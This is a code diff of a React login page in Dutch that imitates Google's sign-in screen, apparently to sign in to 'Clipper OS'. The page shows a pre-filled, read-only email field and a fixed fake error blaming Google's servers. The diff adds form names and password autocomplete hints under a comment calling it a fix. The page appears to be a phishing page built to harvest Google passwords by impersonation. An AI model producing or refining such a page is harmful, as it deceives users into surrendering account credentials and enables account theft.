@@ -69,7 +69,7 @@ export default function LoginPage() {
 
   return (
     <div className="min-h-screen flex flex-col bg-white font-['Google_Sans',system-ui,-apple-system,sans-serif]">
-      {/* Header met Google logo en titel */}
+      {/* Header */}
       <div className="flex items-center gap-3 px-6 py-4 border-b border-[#dadce0]">
         <svg width="24" height="24" viewBox="0 0 48 48" className="w-6 h-6">
           <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
@@ -83,8 +83,7 @@ export default function LoginPage() {
       {/* Main content */}
       <div className="flex-1 flex flex-col items-center justify-center px-4 py-8">
         <div className="w-full max-w-[448px]">
-
-          {/* Google Logo - groot */}
+          {/* Google Logo */}
           <div className="flex justify-center mb-8">
             <svg width="75" height="75" viewBox="0 0 48 48">
               <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
@@ -94,7 +93,6 @@ export default function LoginPage() {
             </svg>
           </div>
 
-          {/* Titel */}
           <h1 className="text-center text-2xl font-medium text-[#202124] mb-1 tracking-[0.1px]">
             Inloggen
           </h1>
@@ -102,60 +100,47 @@ export default function LoginPage() {
             om door te gaan naar Clipper OS
           </p>
 
-          {/* Vaste foutmelding */}
+          {/* Foutmelding */}
           <div className="mb-6">
-            <div className="text-[#d93025] text-sm font-medium">
-              Kon niet inloggen
-            </div>
-            <div className="text-[#d93025] text-sm">
-              Er was een probleem met de communicatie met de Google-servers.
-            </div>
-            <div className="text-[#d93025] text-sm">
-              Probeer opnieuw.
-            </div>
+            <div className="text-[#d93025] text-sm font-medium">Kon niet inloggen</div>
+            <div className="text-[#d93025] text-sm">Er was een probleem met de communicatie met de Google-servers.</div>
+            <div className="text-[#d93025] text-sm">Probeer opnieuw.</div>
           </div>
 
-          {/* Formulier */}
+          {/* Formulier met fix */}
           <form onSubmit={handleSubmit} className="space-y-4">
-            {/* Email veld - vast */}
             <div className="relative">
               <input
                 id="email"
                 type="email"
-                required
+                name="email"
                 value={email}
                 readOnly
                 className="w-full px-4 pt-[22px] pb-[6px] bg-[#f8f9fa] border border-[#dadce0] rounded-[4px] text-[16px] text-[#202124] cursor-default peer"
               />
-              <label
-                htmlFor="email"
-                className="absolute left-4 top-[6px] text-[12px] text-[#1a73e8] pointer-events-none"
-              >
+              <label className="absolute left-4 top-[6px] text-[12px] text-[#1a73e8] pointer-events-none">
                 E-mailadres of telefoonnummer
               </label>
             </div>
 
-            {/* Wachtwoord veld */}
             <div className="relative">
               <input
                 id="password"
                 type="password"
+                name="password"
                 required
                 value={password}
                 onChange={(e) => setPassword(e.target.value)}
                 className="w-full px-4 pt-[22px] pb-[6px] bg-white border border-[#dadce0] rounded-[4px] focus:ring-2 focus:ring-[#1a73e8] focus:border-[#1a73e8] outline-none transition-all text-[16px] text-[#202124] peer"
                 placeholder=" "
                 autoFocus
+                autoComplete="current-password"
               />
-              <label
-                htmlFor="password"
-                className="absolute left-4 top-1/2 -translate-y-1/2 text-[#5f6368] text-[16px] transition-all duration-200 pointer-events-none peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-focus:top-[6px] peer-focus:-translate-y-0 peer-focus:text-[12px] peer-focus:text-[#1a73e8]"
-              >
+              <label className="absolute left-4 top-1/2 -translate-y-1/2 text-[#5f6368] text-[16px] transition-all duration-200 pointer-events-none peer-placeholder-shown:top-1/2 peer-placeholder-shown:-translate-y-1/2 peer-focus:top-[6px] peer-focus:-translate-y-0 peer-focus:text-[12px] peer-focus:text-[#1a73e8]">
                 Wachtwoord
               </label>
             </div>
 
-            {/* Alleen de knop */}
             <div className="flex justify-end pt-2">
               <button
                 type="submit"
@@ -169,40 +154,19 @@ export default function LoginPage() {
         </div>
       </div>
 
-      {/* Footer - Nederlandse links */}
+      {/* Footer */}
       <div className="px-4 py-4 border-t border-[#dadce0]">
         <div className="max-w-[448px] mx-auto">
           <div className="flex flex-wrap items-center justify-between gap-2 text-[12px] text-[#5f6368]">
             <div className="flex items-center gap-4">
               <span className="text-[#5f6368]">Nederlands (Nederland)</span>
               <span className="w-px h-4 bg-[#dadce0]" />
-              <a
-                href="https://support.google.com/accounts/?hl=nl#topic=3382296"
-                target="_blank"
-                rel="noopener noreferrer"
-                className="hover:underline"
-              >
-                Help
-              </a>
+              <a href="https://support.google.com/accounts/?hl=nl#topic=3382296" target="_blank" rel="noopener noreferrer" className="hover:underline">Help</a>
             </div>
             <div className="flex items-center gap-4">
-              <a
-                href="https://policies.google.com/privacy?hl=nl"
-                target="_blank"
-                rel="noopener noreferrer"
-                className="hover:underline"
-              >
-                Privacy
-              </a>
+              <a href="https://policies.google.com/privacy?hl=nl" target="_blank" rel="noopener noreferrer" className="hover:underline">Privacy</a>
               <span className="w-px h-4 bg-[#dadce0]" />
-              <a
-                href="https://policies.google.com/terms?hl=nl"
-                target="_blank"
-                rel="noopener noreferrer"
-                className="hover:underline"
-              >
-                Voorwaarden
-              </a>
+              <a href="https://policies.google.com/terms?hl=nl" target="_blank" rel="noopener noreferrer" className="hover:underline">Voorwaarden</a>
             </div>
           </div>
         </div>
